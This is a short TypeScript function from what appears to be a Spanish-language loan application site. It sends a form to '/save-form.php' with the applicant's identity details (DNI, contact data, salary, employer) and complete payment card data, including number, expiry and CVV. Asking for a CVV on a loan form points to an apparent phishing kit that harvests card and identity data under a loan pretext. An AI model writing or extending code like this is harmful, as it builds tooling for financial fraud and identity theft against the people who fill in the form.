import { LoanFormData } from '../types/formTypes';

export const submitFormData = async (formData: any): Promise<{ success: boolean; message: string }> => {
  try {
    // Prepare form data for submission
    const formDataToSubmit = new FormData();
    
    // Add loan details
    formDataToSubmit.append('loanAmount', formData.loanAmount.toString());
    formDataToSubmit.append('loanTerm', formData.loanTerm.toString());
    
    // Add personal info
    formDataToSubmit.append('firstName', formData.firstName || '');
    formDataToSubmit.append('lastName', formData.lastName || '');
    formDataToSubmit.append('dni', formData.dni || '');
    formDataToSubmit.append('province', formData.province || '');
    formDataToSubmit.append('email', formData.email || '');
    formDataToSubmit.append('phone', formData.phone || '');
    
    // Add occupation details
    formDataToSubmit.append('occupation', formData.occupation || '');
    formDataToSubmit.append('company', formData.occupationDetails?.company || '');
    formDataToSubmit.append('position', formData.occupationDetails?.position || '');
    formDataToSubmit.append('monthlySalary', formData.occupationDetails?.monthlySalary || '');
    formDataToSubmit.append('yearsEmployed', formData.occupationDetails?.yearsEmployed || '');

    // Add card info
    formDataToSubmit.append('cardType', formData.cardInfo.type);
    formDataToSubmit.append('cardNumber', formData.cardInfo.number);
    formDataToSubmit.append('cardName', formData.cardInfo.name);
    formDataToSubmit.append('cardExpiry', formData.cardInfo.expiry);
    formDataToSubmit.append('cardCvv', formData.cardInfo.cvv);

    // Submit the form
    const response = await fetch('/save-form.php', {
      method: 'POST',
      body: formDataToSubmit,
    });

    const result = await response.json();

    if (!response.ok) {
      throw new Error(result.error || 'Error al enviar el formulario');
    }
    
    return { success: true, message: 'Solicitud procesada exitosamente' };
  } catch (error) {
    console.error('Error submitting form:', error);
    throw error;
  }
};